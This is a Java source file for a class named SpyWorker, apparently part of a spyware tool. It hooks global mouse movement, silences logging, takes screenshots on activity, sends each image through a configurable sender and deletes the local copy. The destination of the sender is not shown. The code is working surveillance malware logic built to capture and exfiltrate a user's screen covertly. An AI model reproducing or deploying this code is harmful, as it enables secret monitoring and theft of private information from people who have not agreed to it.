package app.util;

import app.listener.RunnableWorkerMouseListener;
import app.screenshot.PhotoMaker;
import app.sender.Sender;
import app.sender.factory.SendersFactory;
import org.jnativehook.GlobalScreen;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.LogManager;

import static app.constant.ProjectConstants.USER_CONFIG_FILE_NAME;

public class SpyWorker implements Runnable {

  private PhotoMaker maker;
  private Sender sender;

  public void init(int program) {
    try {
      ReadWriteProperties fileWorker = new ReadWriteProperties(Paths.get(USER_CONFIG_FILE_NAME));
      ExecutorService service = Executors.newCachedThreadPool();
      maker = new PhotoMaker();
      sender = new SendersFactory(fileWorker)
          .getSender(program)
          .orElseThrow(IllegalStateException::new);
      RunnableWorkerMouseListener listener = new RunnableWorkerMouseListener(this, 500, 15, 15,
          service
      );
      GlobalScreen.registerNativeHook();
      LogManager.getLogManager().reset();
      GlobalScreen.addNativeMouseMotionListener(listener);
    }
    catch (Exception e) {
      throw new IllegalStateException(e);
    }
  }

  @Override
  public void run() {
    File image;
    try {
      image = maker.takeScreenshot("png", String.valueOf(System.nanoTime()));
      sender.sendFile(image);
      System.out.println("File was sent");
      image.delete();
    }
    catch (IOException | AWTException e) {
      e.printStackTrace();
    }
  }
}
